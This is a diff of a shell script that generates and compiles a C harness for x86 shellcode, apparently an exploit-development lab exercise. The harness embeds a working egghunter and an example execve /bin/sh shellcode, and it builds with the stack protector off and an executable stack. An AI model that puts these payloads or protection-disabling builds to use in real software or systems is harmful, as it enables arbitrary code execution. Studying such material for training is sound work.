@@ -1,22 +1,36 @@
+# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
 echo '######### NASM #########'
-
-echo '[+] Assembling with Nasm ... '
-nasm -f elf32 -o $1.o $1.nasm
+echo '[+] Customizing Tag: '$1 # $1 Tag like: ABCD
+tag=`echo -n $1 | xxd -ps | sed 's/[[:xdigit:]]\{2\}/\\\x&/g'`
 echo '[+] Done!'
 
-echo '[+] Linking ...'
-ld -z execstack -o $1 $1.o
+echo '[+] Customizing Shellcode: '$2 # $2 Shellcode: \x00\x01..
+shellcode=$2
 echo '[+] Done!'
 
-# Remove object file
-rm -rf $1.o
+echo '[+] Assemble shellcode C ...'
 
-echo '[+] Dumping Shellcode ...'
-objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'
+echo "#include<stdio.h>" >shellcode.c
+echo "#include<string.h>" >>shellcode.c
+echo "#define EGG \"$tag\"" >>shellcode.c
+echo "unsigned char shellcode[] = EGG" >>shellcode.c
+echo "                            EGG" >>shellcode.c
+echo "                            \"$shellcode\";" >>shellcode.c
+echo "unsigned char egghunter[] = \"\x31\xd2\x66\x81\xca\xff\x0f\x42\"" >>shellcode.c
+echo "                            \"\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\"" >>shellcode.c
+echo "                            \"\x3c\xf2\x74\xed\xb8\"" >>shellcode.c
+echo "                            EGG" >>shellcode.c
+echo "                            \"\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\"" >>shellcode.c
+echo "                            \"\xff\xe7\";" >>shellcode.c
+echo "void" >>shellcode.c
+echo "main() {" >>shellcode.c
+echo "    printf(\"Shellcode Length: %d\\n\", strlen(egghunter));" >>shellcode.c
+echo "    int (*ret)() = (int(*)())egghunter;" >>shellcode.c
+echo "    ret();" >>shellcode.c
+echo "}" >>shellcode.c
+
 echo '[+] Done!'
-
-# Remove executable
-rm -rf $1
 
 echo '[+] Assemble shellcode.c ...'
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
